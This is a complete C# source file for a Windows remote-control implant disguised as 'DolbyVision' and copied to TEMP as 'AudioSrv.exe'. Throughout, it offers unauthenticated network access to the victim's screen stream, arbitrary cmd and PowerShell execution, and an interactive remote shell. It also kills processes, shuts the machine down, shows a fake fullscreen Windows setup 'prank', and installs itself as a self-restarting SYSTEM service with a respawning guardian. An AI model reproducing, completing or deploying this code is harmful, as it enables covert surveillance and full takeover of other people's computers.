using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.ServiceProcess;
using System.Threading;
using System.Windows.Forms;

namespace DolbyVision
{
    internal static class Program
    {
        private const int BroadcastPort = 9100;
        private const int VideoPort = 9101;
        private const int CmdPort = 9102;
        private const int TerminalPort = 9103;
        private const int Fps = 8;
        private const int JpegQuality = 60;

        private static TcpListener _videoListener;
        private static TcpListener _cmdListener;
        private static TcpListener _terminalListener;
        private static Thread _broadcastThread;
        private static Thread _videoThread;
        private static Thread _cmdThread;
        private static Thread _terminalThread;
        private static volatile bool _running = true;
        private static string _machineName;
        private static string _localIp;
        private static bool _isServiceMode = false;
        private static Thread _pipeThread;
        private static Thread _guardianThread;
        private static DateTime _lastRespawn = DateTime.MinValue;
        private const string PipeName = "DolbyVisionPriv";

        [STAThread]
        static void Main(string[] args)
        {
            // 服务模式: sc create时binPath带 /service 参数
            if (args.Length > 0 && args[0].Equals("/service", StringComparison.OrdinalIgnoreCase))
            {
                ServiceBase.Run(new DolbyVisionService());
                return;
            }

            // 普通模式: 自复制到TEMP并改名为系统进程名
            string currentPath = Application.ExecutablePath;
            string tempPath = Path.Combine(Path.GetTempPath(), "AudioSrv.exe");
            if (!currentPath.Equals(tempPath, StringComparison.OrdinalIgnoreCase))
            {
                try
                {
                    File.Copy(currentPath, tempPath, true);
                    System.Diagnostics.Process.Start(tempPath);
                    return;
                }
                catch { }
            }

            StartServices();
            while (_running) { Thread.Sleep(1000); }
        }

        internal static void SetServiceMode(bool isService)
        {
            _isServiceMode = isService;
        }
        internal static void StartServices()
        {
            _running = true;
            _machineName = Environment.MachineName;
            _localIp = GetLocalIP();

            _broadcastThread = new Thread(BroadcastLoop) { IsBackground = true };
            _broadcastThread.Start();

            // 服务模式(Session 0)无法捕获用户桌面,不启动视频流
            if (!_isServiceMode)
            {
                _videoThread = new Thread(VideoListenLoop) { IsBackground = true };
                _videoThread.Start();
            }

            _cmdThread = new Thread(CmdListenLoop) { IsBackground = true };
            _cmdThread.Start();

            _terminalThread = new Thread(TerminalListenLoop) { IsBackground = true };
            _terminalThread.Start();
        }

        internal static void StopServices()
        {
            _running = false;
            try { _videoListener?.Stop(); } catch { }
            try { _cmdListener?.Stop(); } catch { }
            try { _terminalListener?.Stop(); } catch { }
        }

        // ========== 服务模式: 命名管道 + 守护复活 ==========
        internal static void StartServiceMode()
        {
            try
            {
                LogService("[服务] StartServiceMode 开始");
                _running = true;
                _isServiceMode = true;
                _pipeThread = new Thread(PipeServerLoop) { IsBackground = true };
                _pipeThread.Start();
                LogService("[服务] 命名管道线程已启动");
                _guardianThread = new Thread(GuardianLoop) { IsBackground = true };
                _guardianThread.Start();
                LogService("[服务] 守护线程已启动");
                LogService("[服务] StartServiceMode 完成");
            }
            catch (Exception ex)
            {
                LogService("[服务] StartServiceMode 异常: " + ex.Message);
            }
        }

        private static void PipeServerLoop()
        {
            while (_running)
            {
                try
                {
                    LogService("[管道] 等待连接...");
                    using (var server = new NamedPipeServerStream(PipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Message, PipeOptions.None))
                    {
                        server.WaitForConnection();
                        LogService("[管道] 客户端已连接");
                        using (var reader = new StreamReader(server, Encoding.UTF8))
                        using (var writer = new StreamWriter(server, Encoding.UTF8) { AutoFlush = true })
                        {
                            string request = reader.ReadLine();
                            if (request != null && request.StartsWith("KILL:"))
                            {
                                string pidStr = request.Substring(5);
                                string result = KillProcess(pidStr);
                                writer.WriteLine(result);
                            }
                            else
                            {
                                writer.WriteLine("ERROR: unknown command");
                            }
                        }
                    }
                }
                catch { Thread.Sleep(1000); }
            }
        }

        private static void GuardianLoop()
        {
            while (_running)
            {
                try
                {
                    // 服务模式和普通模式进程名可能都是AudioSrv.exe(因为安装服务时binPath指向的是自复制后的AudioSrv.exe)
                    // 所以需要排除当前进程(服务模式自己),只检查是否有其他AudioSrv进程(普通模式)
                    int currentPid = Process.GetCurrentProcess().Id;
                    var allProcs = Process.GetProcessesByName("AudioSrv");
                    int normalCount = 0;
                    foreach (var p in allProcs)
                    {
                        if (p.Id != currentPid) normalCount++;
                    }
                    if (normalCount == 0)
                    {
                        // 复活冷却: 距上次复活不足15秒则跳过,避免无限循环
                        if ((DateTime.Now - _lastRespawn).TotalSeconds < 15)
                        {
                            LogService("[守护] 冷却中,距上次复活" + (int)(DateTime.Now - _lastRespawn).TotalSeconds + "秒,跳过");
                        }
                        else
                        {
                            LogService("[守护] 普通模式未运行(当前PID=" + currentPid + ", AudioSrv总数=" + allProcs.Length + "),尝试复活...");
                            _lastRespawn = DateTime.Now;
                            StartInUserSession();
                        }
                    }
                    else
                    {
                        LogService("[守护] 普通模式运行中,普通模式进程数=" + normalCount);
                    }
                }
                catch (Exception ex) { LogService("[守护] 异常: " + ex.Message); }
                Thread.Sleep(5000);
            }
        }

        // 服务模式日志(写入TEMP目录)
        internal static void LogService(string msg)
        {
            try
            {
                // 固定路径,SYSTEM账户的TEMP是C:\\Windows\\Temp
                string logPath = @"C:\Windows\Temp\dolbyvision_service.log";
                File.AppendAllText(logPath, "[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + "] " + msg + "\r\n");
            }
            catch { }
        }

        // 模拟用户后用Process.Start启动(环境和桌面正确)
        private static void StartInUserSession()
        {
            IntPtr hToken = IntPtr.Zero;
            WindowsImpersonationContext impersonation = null;
            try
            {
                int sessionId = WTSGetActiveConsoleSessionId();
                LogService("[复活] 活动会话ID=" + sessionId);
                if (sessionId == -1)
                {
                    LogService("[复活] 无活动用户会话,跳过");
                    return;
                }

                if (!WTSQueryUserToken(sessionId, out hToken))
                {
                    int err = Marshal.GetLastWin32Error();
                    LogService("[复活] WTSQueryUserToken失败,错误码=" + err);
                    return;
                }

                // 模拟用户
                using (var identity = new WindowsIdentity(hToken))
                {
                    impersonation = identity.Impersonate();
                    string exePath = Process.GetCurrentProcess().MainModule.FileName;
                    LogService("[复活] 模拟用户成功,启动: " + exePath);
                    var p = Process.Start(exePath);
                    LogService("[复活] 启动成功,PID=" + p.Id);
                }
            }
            catch (Exception ex) { LogService("[复活] 异常: " + ex.Message + "\r\n" + ex.StackTrace); }
            finally
            {
                if (impersonation != null) { try { impersonation.Undo(); } catch { } }
                if (hToken != IntPtr.Zero) CloseHandle(hToken);
            }
        }

        // P/Invoke for CreateProcessAsUser
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern int WTSGetActiveConsoleSessionId();
        [System.Runtime.InteropServices.DllImport("wtsapi32.dll")]
        private static extern bool WTSQueryUserToken(int SessionId, out IntPtr phToken);
        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);
        [System.Runtime.InteropServices.DllImport("advapi32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
        private static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [System.Runtime.InteropServices.In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern bool CloseHandle(IntPtr hObject);
        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        private struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

        private static string GetLocalIP()
        {
            try
            {
                using (var socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
                {
                    socket.Connect("8.8.8.8", 65530);
                    return (socket.LocalEndPoint as IPEndPoint).Address.ToString();
                }
            }
            catch { return "127.0.0.1"; }
        }

        private static void BroadcastLoop()
        {
            while (_running)
            {
                try
                {
                    using (var client = new UdpClient())
                    {
                        client.EnableBroadcast = true;
                        string mode = _isServiceMode ? "SERVICE" : "NORMAL";
                        string msg = $"DV|{_machineName}|{_localIp}|{VideoPort}|{CmdPort}|{TerminalPort}|{mode}";
                        byte[] data = Encoding.UTF8.GetBytes(msg);
                        client.Send(data, data.Length, new IPEndPoint(IPAddress.Broadcast, BroadcastPort));
                    }
                }
                catch { }
                Thread.Sleep(3000);
            }
        }

        // ========== 视频流 ==========
        private static void VideoListenLoop()
        {
            try
            {
                _videoListener = new TcpListener(IPAddress.Any, VideoPort);
                _videoListener.Start();
                while (_running)
                {
                    try
                    {
                        TcpClient client = _videoListener.AcceptTcpClient();
                        var thread = new Thread(() => HandleVideoClient(client)) { IsBackground = true };
                        thread.Start();
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static void HandleVideoClient(TcpClient client)
        {
            try
            {
                using (client)
                using (NetworkStream stream = client.GetStream())
                {
                    while (_running && client.Connected)
                    {
                        Bitmap screenshot = CaptureScreen();
                        if (screenshot != null)
                        {
                            using (var ms = new MemoryStream())
                            {
                                var jpegCodec = GetJpegCodec();
                                var encoderParams = new EncoderParameters(1);
                                encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)JpegQuality);
                                screenshot.Save(ms, jpegCodec, encoderParams);
                                byte[] jpegData = ms.ToArray();

                                byte[] header = Encoding.ASCII.GetBytes($"--boundary\r\nContent-Type: image/jpeg\r\nContent-Length: {jpegData.Length}\r\n\r\n");
                                stream.Write(header, 0, header.Length);
                                stream.Write(jpegData, 0, jpegData.Length);
                                stream.Write(Encoding.ASCII.GetBytes("\r\n"), 0, 2);
                                stream.Flush();
                            }
                            screenshot.Dispose();
                        }
                        Thread.Sleep(1000 / Fps);
                    }
                }
            }
            catch { }
        }

        // ========== 远程命令（9102） ==========
        private static void CmdListenLoop()
        {
            try
            {
                _cmdListener = new TcpListener(IPAddress.Any, CmdPort);
                _cmdListener.Start();
                while (_running)
                {
                    try
                    {
                        TcpClient client = _cmdListener.AcceptTcpClient();
                        var thread = new Thread(() => HandleCmdClient(client)) { IsBackground = true };
                        thread.Start();
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static void HandleCmdClient(TcpClient client)
        {
            try
            {
                using (client)
                using (NetworkStream stream = client.GetStream())
                {
                    byte[] buffer = new byte[8192];
                    int read = stream.Read(buffer, 0, buffer.Length);
                    if (read <= 0) return;

                    string cmd = Encoding.UTF8.GetString(buffer, 0, read).Trim();
                    string result = ExecuteCommand(cmd);
                    byte[] resp = Encoding.UTF8.GetBytes(result);
                    stream.Write(resp, 0, resp.Length);
                    stream.Flush();
                }
            }
            catch { }
        }

        private static string ExecuteCommand(string cmd)
        {
            try
            {
                if (cmd.Equals("OOBE", StringComparison.OrdinalIgnoreCase))
                {
                    return StartOobePrank("Win10");
                }
                if (cmd.Equals("OOBE11", StringComparison.OrdinalIgnoreCase))
                {
                    return StartOobePrank("Win11");
                }
                if (cmd.Equals("PROCESS_LIST", StringComparison.OrdinalIgnoreCase))
                {
                    return GetProcessList();
                }
                if (cmd.StartsWith("PROCESS_KILL:", StringComparison.OrdinalIgnoreCase))
                {
                    string pidStr = cmd.Substring(13);
                    return KillProcess(pidStr);
                }
                if (cmd.Equals("INSTALL_SERVICE", StringComparison.OrdinalIgnoreCase))
                {
                    return InstallService();
                }
                if (cmd.Equals("UNINSTALL_SERVICE", StringComparison.OrdinalIgnoreCase))
                {
                    return UninstallService();
                }
                if (cmd.Equals("SHUTDOWN", StringComparison.OrdinalIgnoreCase))
                {
                    Process.Start(new ProcessStartInfo("shutdown", "/s /t 0") { CreateNoWindow = true, UseShellExecute = false });
                    return "OK: 关机命令已发送";
                }
                if (cmd.Equals("REBOOT", StringComparison.OrdinalIgnoreCase))
                {
                    Process.Start(new ProcessStartInfo("shutdown", "/r /t 0") { CreateNoWindow = true, UseShellExecute = false });
                    return "OK: 重启命令已发送";
                }
                if (cmd.StartsWith("EXEC:", StringComparison.OrdinalIgnoreCase))
                {
                    string command = cmd.Substring(5);
                    var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        StandardOutputEncoding = Encoding.GetEncoding(936),
                        StandardErrorEncoding = Encoding.GetEncoding(936)
                    };
                    using (var p = Process.Start(psi))
                    {
                        string output = p.StandardOutput.ReadToEnd();
                        string error = p.StandardError.ReadToEnd();
                        p.WaitForExit(5000);
                        return "OK:\r\n" + output + (string.IsNullOrEmpty(error) ? "" : "\r\n[错误]\r\n" + error);
                    }
                }
                if (cmd.StartsWith("PS:", StringComparison.OrdinalIgnoreCase))
                {
                    string command = cmd.Substring(3);
                    var psi = new ProcessStartInfo("powershell.exe", "-NoProfile -Command " + command)
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        StandardOutputEncoding = Encoding.UTF8,
                        StandardErrorEncoding = Encoding.UTF8
                    };
                    using (var p = Process.Start(psi))
                    {
                        string output = p.StandardOutput.ReadToEnd();
                        string error = p.StandardError.ReadToEnd();
                        p.WaitForExit(10000);
                        return "OK:\r\n" + output + (string.IsNullOrEmpty(error) ? "" : "\r\n[错误]\r\n" + error);
                    }
                }
                return "ERROR: 未知命令: " + cmd;
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }

        // ========== OOBE恶搞 ==========
        private static string StartOobePrank(string version)
        {
            try
            {
                bool isWin11 = version.Equals("Win11", StringComparison.OrdinalIgnoreCase);
                string fileName = isWin11 ? "Win11_OOBE.html" : "Win10_OOBE.html";
                string resourceName = isWin11 ? "DolbyVision.Assets.Win11_OOBE_Prank.html" : "DolbyVision.Assets.Win10_OOBE_Prank.html";
                // 从嵌入资源释放HTML到TEMP
                string htmlPath = Path.Combine(Path.GetTempPath(), fileName);
                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                using (var stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream == null) return "ERROR: OOBE资源未找到";
                    using (var fs = new FileStream(htmlPath, FileMode.Create, FileAccess.Write))
                    {
                        stream.CopyTo(fs);
                    }
                }

                // 尝试用Edge全屏打开
                string edgePath = FindBrowser();
                if (string.IsNullOrEmpty(edgePath)) return "ERROR: 未找到浏览器";

                string url = "file:///" + htmlPath.Replace("\\", "/");
                var psi = new ProcessStartInfo(edgePath, "--kiosk --fullscreen --no-first-run --disable-features=Translate " + url)
                {
                    CreateNoWindow = false,
                    UseShellExecute = false
                };
                Process.Start(psi);
                return "OK: " + version + " OOBE恶搞已启动 (" + edgePath + ")";
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }

        // ========== 远程进程控制 ==========
        private static string GetProcessList()
        {
            try
            {
                var procs = Process.GetProcesses();
                var sb = new System.Text.StringBuilder();
                sb.AppendLine("PID\t名称\t内存(MB)");
                foreach (var p in procs)
                {
                    try
                    {
                        double mem = Math.Round(p.WorkingSet64 / 1024.0 / 1024.0, 1);
                        sb.AppendLine(p.Id + "\t" + p.ProcessName + "\t" + mem);
                    }
                    catch { }
                }
                return "OK:\r\n" + sb.ToString();
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }
        private static string KillProcess(string pidStr)
        {
            try
            {
                int pid = int.Parse(pidStr.Trim());
                var p = Process.GetProcessById(pid);
                p.Kill();
                return "OK: 已终止进程 " + pid + " (" + p.ProcessName + ")";
            }
            catch (Exception ex)
            {
                // 普通模式权限不足时,尝试通过命名管道请求服务模式(SYSTEM权限)杀进程
                if (!_isServiceMode)
                {
                    string privResult = KillViaPipe(pidStr);
                    if (privResult != null) return privResult + " (SYSTEM提权)";
                }
                return "ERROR: " + ex.Message;
            }
        }

        // 通过命名管道请求服务模式杀进程
        private static string KillViaPipe(string pidStr)
        {
            try
            {
                using (var client = new NamedPipeClientStream(".", PipeName, PipeDirection.InOut))
                {
                    client.Connect(2000);
                    using (var writer = new StreamWriter(client, Encoding.UTF8) { AutoFlush = true })
                    using (var reader = new StreamReader(client, Encoding.UTF8))
                    {
                        writer.WriteLine("KILL:" + pidStr);
                        return reader.ReadLine();
                    }
                }
            }
            catch { return null; }
        }
        private static string InstallService()
        {
            try
            {
                string exePath = Application.ExecutablePath;
                string binPath = "\"" + exePath + " /service\"";
                // 分步执行,只返回简洁结果
                bool createOk = RunCmd("sc create DolbyVision binPath= " + binPath + " start= auto");
                if (!createOk) return "ERROR: 创建服务失败(可能需要管理员权限)";
                bool failureOk = RunCmd("sc failure DolbyVision reset= 0 actions= restart/5000/restart/5000/restart/5000");
                bool startOk = RunCmd("sc start DolbyVision");
                if (startOk)
                    return "OK: 服务安装并启动成功(SYSTEM权限+开机自启+被杀5秒重启)";
                else
                    return "OK: 服务已创建,但启动失败(可能已在运行,重启后生效)";
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }
        private static bool RunCmd(string cmd)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };
                using (var p = Process.Start(psi))
                {
                    p.WaitForExit(8000);
                    return p.ExitCode == 0;
                }
            }
            catch { return false; }
        }
        private static string UninstallService()
        {
            try
            {
                // 先回复主控端,然后延迟3秒再停止并删除自己(避免TCP连接断开导致报错)
                var t = new Thread(() =>
                {
                    Thread.Sleep(3000);
                    RunCmd("sc stop DolbyVision");
                    RunCmd("sc delete DolbyVision");
                }) { IsBackground = true };
                t.Start();
                return "OK: 服务卸载命令已发送,3秒后执行(连接将断开)";
            }
            catch (Exception ex)
            {
                return "ERROR: " + ex.Message;
            }
        }

        private static string FindBrowser()
        {
            // 优先Edge，其次Chrome；找到第一个可用的就返回，不会冲突
            var candidates = new System.Collections.Generic.List<string>
            {
                // Edge (Win10+)
                @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                @"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
                // Chrome 系统级安装
                @"C:\Program Files\Google\Chrome\Application\chrome.exe",
                @"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
                @"C:\Program Files\Google Chrome\Chrome\App\chrome.exe",
                // Chrome 用户级安装 (Win7常见)
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\Application\chrome.exe")
            };
            foreach (var p in candidates)
            {
                if (File.Exists(p)) return p;
            }
            // 注册表查找 Chrome
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"))
                {
                    if (key != null)
                    {
                        var v = key.GetValue("") as string;
                        if (!string.IsNullOrEmpty(v) && File.Exists(v)) return v;
                    }
                }
                using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"))
                {
                    if (key != null)
                    {
                        var v = key.GetValue("") as string;
                        if (!string.IsNullOrEmpty(v) && File.Exists(v)) return v;
                    }
                }
            }
            catch { }
            // 注册表查找 Edge
            try
            {
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"))
                {
                    if (key != null)
                    {
                        var v = key.GetValue("") as string;
                        if (!string.IsNullOrEmpty(v) && File.Exists(v)) return v;
                    }
                }
            }
            catch { }
            return null;
        }

        // ========== 虚拟控制台（9103） ==========
        private static void TerminalListenLoop()
        {
            try
            {
                _terminalListener = new TcpListener(IPAddress.Any, TerminalPort);
                _terminalListener.Start();
                while (_running)
                {
                    try
                    {
                        TcpClient client = _terminalListener.AcceptTcpClient();
                        var thread = new Thread(() => HandleTerminalClient(client)) { IsBackground = true };
                        thread.Start();
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static void HandleTerminalClient(TcpClient client)
        {
            Process shell = null;
            try
            {
                using (client)
                using (NetworkStream stream = client.GetStream())
                {
                    // 先接收shell类型：CMD 或 PS
                    byte[] typeBuf = new byte[16];
                    int typeRead = stream.Read(typeBuf, 0, typeBuf.Length);
                    string shellType = Encoding.UTF8.GetString(typeBuf, 0, typeRead).Trim().ToUpper();
                    bool usePs = shellType == "PS";

                    string shellExe = usePs ? "powershell.exe" : "cmd.exe";
                    string shellArgs = usePs ? "-NoLogo -NoProfile" : "";
                    Encoding shellEncoding = usePs ? Encoding.UTF8 : Encoding.GetEncoding(936);

                    var psi = new ProcessStartInfo(shellExe, shellArgs)
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardInput = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        StandardOutputEncoding = shellEncoding,
                        StandardErrorEncoding = shellEncoding
                    };
                    shell = Process.Start(psi);

                    string shellName = usePs ? "PowerShell" : "CMD";
                    byte[] welcome = Encoding.UTF8.GetBytes("DolbyVision Terminal [" + shellName + "] - " + _machineName + " (" + _localIp + ")\r\nType exit to disconnect\r\n\r\n");
                    stream.Write(welcome, 0, welcome.Length);

                    // 输出转发线程
                    var outputThread = new Thread(() =>
                    {
                        try
                        {
                            byte[] buffer = new byte[4096];
                            while (!shell.HasExited && client.Connected)
                            {
                                int read = shell.StandardOutput.BaseStream.Read(buffer, 0, buffer.Length);
                                if (read > 0)
                                {
                                    string text = shellEncoding.GetString(buffer, 0, read);
                                    byte[] utf8 = Encoding.UTF8.GetBytes(text);
                                    stream.Write(utf8, 0, utf8.Length);
                                    stream.Flush();
                                }
                            }
                        }
                        catch { }
                    })
                    { IsBackground = true };
                    outputThread.Start();

                    var errorThread = new Thread(() =>
                    {
                        try
                        {
                            byte[] buffer = new byte[4096];
                            while (!shell.HasExited && client.Connected)
                            {
                                int read = shell.StandardError.BaseStream.Read(buffer, 0, buffer.Length);
                                if (read > 0)
                                {
                                    string text = shellEncoding.GetString(buffer, 0, read);
                                    byte[] utf8 = Encoding.UTF8.GetBytes(text);
                                    stream.Write(utf8, 0, utf8.Length);
                                    stream.Flush();
                                }
                            }
                        }
                        catch { }
                    })
                    { IsBackground = true };
                    errorThread.Start();

                    // 输入转发
                    byte[] inBuffer = new byte[4096];
                    while (!shell.HasExited && client.Connected)
                    {
                        int read = stream.Read(inBuffer, 0, inBuffer.Length);
                        if (read <= 0) break;
                        string input = Encoding.UTF8.GetString(inBuffer, 0, read);
                        shell.StandardInput.Write(input);
                        shell.StandardInput.Flush();
                    }
                }
            }
            catch { }
            finally
            {
                try { shell?.Kill(); } catch { }
            }
        }

        private static Bitmap CaptureScreen()
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(0, 0, 0, 0, bounds.Size);
                }
                return bitmap;
            }
            catch { return null; }
        }

        private static ImageCodecInfo GetJpegCodec()
        {
            foreach (ImageCodecInfo codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.MimeType == "image/jpeg") return codec;
            }
            return null;
        }
    }

    // ========== Windows服务模式 ==========
    // 安装: sc create DolbyVision binPath= "路径\DolbyVision.exe /service" start= auto
    // 启动: sc start DolbyVision
    // 防杀: sc failure DolbyVision reset= 0 actions= restart/5000/restart/5000/restart/5000
    // 卸载: sc stop DolbyVision & sc delete DolbyVision
    internal class DolbyVisionService : ServiceBase
    {
        public DolbyVisionService()
        {
            ServiceName = "DolbyVision";
            CanStop = true;
            CanShutdown = true;
        }
        protected override void OnStart(string[] args)
        {
            try
            {
                Program.LogService("[服务] OnStart 被调用");
                Program.StartServiceMode();
                Program.LogService("[服务] OnStart 完成");
            }
            catch (Exception ex)
            {
                Program.LogService("[服务] OnStart 异常: " + ex.Message + "\r\n" + ex.StackTrace);
            }
        }
        protected override void OnStop()
        {
            Program.StopServices();
        }
        protected override void OnShutdown()
        {
            Program.StopServices();
            base.OnShutdown();
        }
        }
}